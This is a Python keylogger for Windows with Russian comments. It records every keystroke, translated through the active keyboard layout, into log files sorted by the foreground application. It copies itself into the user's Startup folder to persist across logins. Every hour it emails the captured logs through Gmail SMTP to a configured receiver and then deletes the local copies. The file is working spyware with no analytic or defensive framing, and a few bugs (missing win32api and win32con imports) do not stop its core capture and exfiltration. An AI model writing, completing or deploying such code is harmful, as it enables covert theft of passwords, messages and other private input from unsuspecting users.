import os
import re
import ctypes
import threading
import sys
from shutil import copyfile, rmtree
from pathlib import Path
import time
import mimetypes
import smtplib
from email.message import EmailMessage

import win32gui
import win32process
from pynput import keyboard

# Настройка SMTP
email_settings = {
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 465,
        "login": "Твоя Google Почта",
        "password": "Твой пароль приложения",
        "sender": "отправитель",
        "receiver": "получатель",
    }

LOGS_DIR = 'logs'
os.makedirs(LOGS_DIR, exist_ok=True)

user32 = ctypes.WinDLL('user32', use_last_error=True)

log_buffer = ""
last_app = ""

def autorun():
    try:
        if getattr(sys, 'frozen', False):
            # Запуск из .exe
            this_file = Path(sys.executable).resolve()
        else:
            # Запуск из .py
            this_file = Path(__file__).resolve()
        startup_dir = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
        target = startup_dir / this_file.name

        if not target.exists():
            copyfile(this_file, target)
        else:
            pass
    except Exception as e:
        pass

def remove_logs_inside_directory(logs_dir):
    try:
        if os.path.exists(logs_dir):
            for item in os.listdir(logs_dir):  # Перечисляем все элементы в директории
                item_path = os.path.join(logs_dir, item)  # Получаем полный путь
                if os.path.isfile(item_path):  # Проверяем, является ли элемент файлом
                    os.remove(item_path)  # Удаляем файл
                    print(f'Файл "{item_path}" был успешно удален.')
                elif os.path.isdir(item_path):  # Проверяем, является ли элемент папкой
                    rmtree(item_path)  # Удаляем папку и ее содержимое
                    print(f'Папка "{item_path}" была успешно удалена.')
            print(f'Все вложенные файлы и папки в "{logs_dir}" были успешно удалены.')
        else:
            print(f'Папка "{logs_dir}" не существует.')
    except Exception as e:
        print(f'Произошла ошибка при удалении вложенных файлов и папок в "{logs_dir}": {e}')

def create_logs_directory(logs_dir='logs'):
    try:
        # Проверяем, существует ли папка
        if not os.path.exists(logs_dir):
            os.makedirs(logs_dir)  # Создаем директорию
            print(f'Папка "{logs_dir}" была успешно создана.')
        else:
            print(f'Папка "{logs_dir}" уже существует.')
    except Exception as e:
        print(f'Произошла ошибка при создании папки "{logs_dir}": {e}')

def sanitize_filename(name):
    name = name.strip()
    # Заменяем все кроме букв, цифр, -, _ и пробелов на _
    return re.sub(r'[^\w\- ]', '_', name)

def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        return title or ""
    except Exception:
        return ""

def get_active_process_name():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, process_id = win32process.GetWindowThreadProcessId(hwnd)

        # Получаем информацию о процессе
        handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, process_id)
        process_name = win32process.GetModuleFileNameEx(handle, 0)  # Получаем имя исполняемого файла процесса
        
        return process_name.split('\\')[-1] if process_name else "Unknown"
    except Exception:
        return "Unknown"

def get_current_app_name():
    title = get_active_window_title()
    return title if title else get_active_process_name()

def flush_log():
    global log_buffer, last_app
    if log_buffer and last_app:
        filename = os.path.join(LOGS_DIR, f"{sanitize_filename(last_app)}.txt")
        with open(filename, "a", encoding='utf-8') as f:
            f.write(log_buffer)
        log_buffer = ""

def get_current_keyboard_layout():
    hwnd = win32gui.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(hwnd, 0)
    kl = user32.GetKeyboardLayout(thread_id)
    return kl

def get_key_state():
    state = (ctypes.c_char * 256)()
    user32.GetKeyboardState(ctypes.byref(state))
    return state

def vk_to_char(vk, keyboard_layout, scan_code, key_state):
    buff = ctypes.create_unicode_buffer(8)
    n = user32.ToUnicodeEx(vk, scan_code, key_state, buff, len(buff), 0, keyboard_layout)
    if n > 0:
        return buff.value
    return ''

def on_press(key):
    global last_app, log_buffer
    current_app = get_current_app_name()
    if current_app != last_app:
        flush_log()
        last_app = current_app
        # Можно раскомментировать, если нужен вывод активного окна
        # print(f"\n[Active application: {last_app}]")

    keyboard_layout = get_current_keyboard_layout()
    key_state = get_key_state()

    try:
        if hasattr(key, 'vk'):
            vk = key.vk
            scan_code = user32.MapVirtualKeyExW(vk, 0, keyboard_layout)
            ch = vk_to_char(vk, keyboard_layout, scan_code, key_state)

            if ch:
                log_buffer += ch
            else:
                # Обработка спецклавиш можно добавить здесь, если нужно
                pass
        else:
            # Обработка нажатий, если у key нет vk, но есть char (например, некоторые символы)
            if hasattr(key, 'char') and key.char:
                log_buffer += key.char
    except Exception as e:
        print(f"Error handle key: {e}")

def send_email_with_attachments(
    smtp_server, smtp_port, login, password,
    sender_email, receiver_email, subject, body, attachment_files
):
    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg.set_content(body)

    for file_path in attachment_files:
        if not os.path.isfile(file_path):
            continue
        ctype, encoding = mimetypes.guess_type(file_path)
        if ctype is None or encoding is not None:
            ctype = 'application/octet-stream'
        maintype, subtype = ctype.split('/', 1)
        with open(file_path, 'rb') as f:
            file_data = f.read()
            file_name = os.path.basename(file_path)
            msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)

    try:
        with smtplib.SMTP_SSL(smtp_server, smtp_port) as smtp:
            smtp.login(login, password)
            smtp.send_message(msg)
        print("[INFO] Письмо успешно отправлено")
    except Exception as e:
        print("[ERROR] Ошибка при отправке письма:", e)

def send_all_files(email_settings):
    email = email_settings.get("receiver")
    if not email:
        print("[WARNING] Не указан email получателя.")
        return
    attachments = []
    for f in os.listdir(LOGS_DIR):
        path = os.path.join(LOGS_DIR, f)
        if os.path.isfile(path):
            attachments.append(path)
    if attachments:
        send_email_with_attachments(
            smtp_server=email_settings["smtp_server"],
            smtp_port=email_settings["smtp_port"],
            login=email_settings["login"],
            password=email_settings["password"],
            sender_email=email_settings["sender"],
            receiver_email=email_settings["receiver"],
            subject="Логи по приложениям",
            body="Прикреплены логи всех приложений за период.",
            attachment_files=attachments,
        )
    else:
        print("[INFO] Нет файлов для отправки.")

def periodic_sender():
    while True:
        time.sleep(3600)  # 1 час
        flush_log()      # Сначала записать буфер в файлы
        try:
            send_all_files(email_settings)
            remove_logs_inside_directory(LOGS_DIR)
        except Exception as e:
            print(f"[ERROR] ошибка отправки {filename}: {e}")

listener = keyboard.Listener(on_press=on_press)
listener.start()
autorun()
create_logs_directory()
# Запуск периодической отправки логов в отдельном потоке
threading.Thread(target=periodic_sender, daemon=True).start()

# Не блокируем поток главным, чтобы слушатель работал постоянно
listener.join()

                    
